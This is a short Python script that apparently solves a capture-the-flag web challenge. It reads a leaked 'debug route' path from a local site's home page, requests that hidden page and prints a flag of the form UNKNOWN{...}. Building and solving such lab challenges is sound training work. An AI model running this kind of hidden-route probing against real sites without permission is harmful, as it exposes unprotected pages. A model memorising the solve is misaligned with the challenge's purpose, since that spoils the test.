import re
import sys

import requests


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8101"
    html = requests.get(base + "/", timeout=5).text
    match = re.search(r"debug route before launch: ([^\s<]+)", html)
    if not match:
        raise SystemExit("hidden path not found")
    flag_page = requests.get(base + match.group(1), timeout=5).text
    flag = re.search(r"UNKNOWN\{[^}]+\}", flag_page)
    if not flag:
        raise SystemExit("flag not found")
    print(flag.group(0))


if __name__ == "__main__":
    main()
